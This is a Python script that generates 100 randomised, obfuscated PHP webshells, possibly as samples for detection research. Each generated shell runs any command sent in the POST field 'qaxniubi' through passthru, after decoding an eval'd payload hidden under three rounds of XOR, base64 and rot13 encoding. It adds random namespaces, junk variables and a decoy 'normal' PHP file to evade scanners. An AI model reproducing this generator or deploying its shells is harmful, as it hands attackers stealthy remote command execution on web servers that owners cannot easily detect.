import os
import random
import base64
import string
import hashlib
import codecs
from pathlib import Path

OUTPUT_DIR = Path("/data/php_webshellv14")
KEY = hashlib.sha256(os.urandom(32)).hexdigest()[:16]

OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

def generate_random_var(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))

def generate_random_namespace():
    parts = [generate_random_var() for _ in range(3)]
    return "\\".join(parts)

def generate_random_class_name():
    return ''.join(random.choices(string.ascii_uppercase, k=1)) + generate_random_var(7)

def generate_random_method_name():
    return ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))

def xor_encode(data, key):
    result = ''
    for i in range(len(data)):
        result += chr(ord(data[i]) ^ ord(key[i % len(key)]))
    return result

def xor_encode_base64(data, key):
    xor_bytes = xor_encode(data, key).encode()
    return base64.b64encode(xor_bytes).decode()

def rot13_encode(data):
    return codecs.encode(data, 'rot13')

def generate_junk_code():
    lines = []
    for _ in range(random.randint(5, 10)):
        var = generate_random_var()
        val = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 15)))
        lines.append(f"${var} = '{val}';")
    return '\n'.join(lines)

def generate_trait_code():
    trait_name = generate_random_class_name()
    method_name = generate_random_method_name()
    return f"""
    trait {trait_name} {{
        private function {method_name}($data) {{
            if (isset($_POST['debug']) && $_POST['debug'] === '1') {{
                echo "[DEBUG] Executing decoded payload\\n";
            }}
            $closure = function($d) {{
                eval($d);
            }};
            $closure($data);
        }}
        
        private function execCommand($cmd) {{
            if (isset($_POST['debug']) && $_POST['debug'] === '1') {{
                echo "[DEBUG] Executing command: " . $cmd . "\\n";
            }}
            ob_start();
            passthru($cmd . " 2>&1");
            $output = ob_get_clean();
            if (isset($_POST['debug']) && $_POST['debug'] === '1') {{
                echo "[DEBUG] Command output length: " . strlen($output) . "\\n";
            }}
            return $output;
        }}
    }}
    """, trait_name, method_name

def generate_closure_code():
    var_name = generate_random_var()
    return f"""
    ${var_name} = Closure::bind(
        function($data) {{
            return $this->processData($data);
        }},
        $this,
        get_class()
    );
    """, var_name

def generate_generator_code():
    func_name = generate_random_method_name()
    return f"""
    private function {func_name}($data) {{
        foreach (str_split($data, 3) as $chunk) {{
            yield $this->processChunk($chunk);
        }}
    }}
    """, func_name

def build_webshell(index):
    namespace = generate_random_namespace()
    main_class_name = generate_random_class_name()
    trait_code, trait_name, trait_method = generate_trait_code()
    closure_code, closure_var = generate_closure_code()
    generator_code, generator_func = generate_generator_code()
    
    # 创建伪装文件
    normal_file_name = f"normal_{index}.php"
    with open(os.path.join(OUTPUT_DIR, normal_file_name), 'w') as f:
        f.write("<?php\nclass NormalClass { public function doNothing() {} }\n?>")
    
    # 实际payload
    payload_code = """
        if (!isset($_POST['qaxniubi'])) {
            if (isset($_POST['debug']) && $_POST['debug'] === '1') {
                echo "[DEBUG] No command provided\\n";
            }
            return;
        }
        
        $cmd = trim($_POST['qaxniubi']);
        if (empty($cmd)) {
            if (isset($_POST['debug']) && $_POST['debug'] === '1') {
                echo "[DEBUG] Empty command\\n";
            }
            return;
        }
        
        if (isset($_POST['debug']) && $_POST['debug'] === '1') {
            echo "[DEBUG] Processing command: " . $cmd . "\\n";
        }
        
        $result = $this->execCommand($cmd);
        if (!empty($result)) {
            echo $result;
        } else if (isset($_POST['debug']) && $_POST['debug'] === '1') {
            echo "[DEBUG] No output from command\\n";
        }
    """
    encoded_payload = payload_code
    for _ in range(3):
        encoded_payload = xor_encode_base64(encoded_payload, KEY)
        encoded_payload = rot13_encode(encoded_payload)
    
    shell = f"""<?php
declare(strict_types=1);
namespace {namespace};

use ArrayObject;
use ArrayIterator;
use Closure;
use Generator;

error_reporting(E_ALL);
ini_set('display_errors', '1');
header('Content-Type: text/plain; charset=UTF-8');

{trait_code}

class {main_class_name} {{
    use \\{namespace}\\{trait_name};
    
    private $data;
    private $iterator;
    private static $instance;
    
    private function __construct($data) {{
        $this->data = $data;
        $this->iterator = new ArrayIterator(new ArrayObject([$data]));
    }}
    
    public static function getInstance($data) {{
        if (self::$instance === null) {{
            self::$instance = new static($data);
        }}
        return self::$instance;
    }}
    
    {generator_code}
    
    private function processChunk($chunk) {{
        return base64_decode($chunk);
    }}
    
    private function processData($data) {{
        $result = '';
        foreach ($this->{generator_func}($data) as $part) {{
            $result .= $part;
        }}
        return $result;
    }}
    
    private function decodeAndExecute($data) {{
        try {{
            {closure_code}
            return ${closure_var}->__invoke($data);
        }} catch (\\Exception $e) {{
            if (isset($_POST['debug']) && $_POST['debug'] === '1') {{
                echo "[DEBUG] Error in decodeAndExecute: " . $e->getMessage() . "\\n";
            }}
            return;
        }}
    }}
    
    public function __call($name, $args) {{
        if ($name === 'execute') {{
            return $this->{trait_method}($this->data);
        }}
        if (isset($_POST['debug']) && $_POST['debug'] === '1') {{
            echo "[DEBUG] Unknown method called: " . $name . "\\n";
        }}
        return;
    }}
}}

@include '{normal_file_name}';

{generate_junk_code()}

$k = '{KEY}';
$p = '{encoded_payload}';
$d = $p;

function xorString($str, $key) {{
    $result = '';
    $keyLen = strlen($key);
    for($i = 0; $i < strlen($str); $i++) {{
        $result .= chr(ord($str[$i]) ^ ord($key[$i % $keyLen]));
    }}
    return $result;
}}

function debugLog($round, $stage, $data) {{
    if (isset($_POST['debug']) && $_POST['debug'] === '1') {{
        echo sprintf("[DEBUG] Round %d - %s:\\n", $round, $stage);
        if ($stage === 'XOR') {{
            echo "Data length: " . strlen($data) . "\\n";
            echo "First 32 bytes (hex): " . bin2hex(substr($data, 0, 32)) . "\\n";
        }} else {{
            echo $data . "\\n";
        }}
    }}
}}

for($round = 0; $round < 3; $round++) {{
    debugLog($round, 'Start', $d);
    
    $d = str_rot13($d);
    debugLog($round, 'After ROT13', $d);
    
    $decoded = base64_decode($d);
    if ($decoded === false) {{
        if (isset($_POST['debug']) && $_POST['debug'] === '1') {{
            echo "[DEBUG] Invalid base64 during decode at round " . $round . "\\n";
        }}
        return;
    }}
    debugLog($round, 'After Base64 Decode', base64_encode($decoded));
    
    $d = xorString($decoded, $k);
    debugLog($round, 'After XOR', $d);
}}

if (isset($_POST['debug']) && $_POST['debug'] === '1') {{
    echo "=== Final Decoded Payload ===\\n";
    echo "Length: " . strlen($d) . "\\n";
    echo "Content:\\n" . htmlspecialchars($d) . "\\n";
    echo "========================\\n\\n";
}}

$magic = \\{namespace}\\{main_class_name}::getInstance($d);
if (!$magic) {{
    if (isset($_POST['debug']) && $_POST['debug'] === '1') {{
        echo "[DEBUG] Failed to create Magic instance\\n";
    }}
    return;
}}

$magic->execute();

?>"""
    return shell

def generate_webshell_samples(n):
    for i in range(n):
        shell_code = build_webshell(i)
        path = os.path.join(OUTPUT_DIR, f"adv_webshell_{i}.php")
        with open(path, 'w') as f:
            f.write(shell_code)
    print(f"Generated {n} advanced PHP WebShells in {OUTPUT_DIR}")

def main():
    num_samples = 100
    generate_webshell_samples(num_samples)

if __name__ == "__main__":
    main() 